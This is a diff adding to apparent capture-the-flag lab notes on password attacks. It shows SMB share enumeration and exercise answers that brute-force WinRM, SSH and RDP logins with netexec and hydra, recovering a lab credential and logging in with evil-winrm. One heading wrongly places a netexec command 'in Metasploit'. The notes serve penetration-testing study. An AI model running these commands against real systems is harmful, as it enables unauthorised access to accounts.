@@ -606,4 +606,48 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:
 [ERROR] invalid reply from target smb://10.129.42.197:445/
 ```
 This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile `hydra` or use another very powerful tool, the [Metasploit framework](https://www.metasploit.com/).
+#### Metasploit Framework
 
+Now we can use `NetExec` again to view the available shares and what privileges we have for them.
+
+```shell
+# In Metasploit
+netexec smb 10.129.42.197 -u "user" -p "password" --shares
+```
+
+To communicate with the server via SMB, we can use, for example, the tool [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). This tool will allow us to view the contents of the shares, upload, or download files if our privileges allow it.
+#### Smbclient
+
+```shell
+smbclient -U user \\\\10.129.42.197\\SHARENAME
+```
+## Exercise
+### Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
+
+```shell
+# I tried with 
+netexec winrm 10.129.202.136 -u username.list -p password.list
+## But it took so much time. So, in pararell I got access via SSH and gathered all the valid accounts and create my own username list
+# Finally, I tried with
+netexec winrm 10.129.202.136 -u 2.list -p password.list # where 2.list is my custom username list
+---
+WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\cassie:november
+WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\chris:november
+WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\dennis:november
+WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\jerome:november
+WINRM       10.129.202.136  5985   WINSRV           [+] WINSRV\john:november (Pwn3d!)
+```
+
+```
+evil-winrm -i 10.129.202.136 -u john -p november
+```
+### Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
+
+```shell
+hydra -L username.list -P password.list ssh://10.129.202.136
+```
+### Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
+
+```shell
+hydra -L username.list -P password.list rdp://10.129.202.136
+```
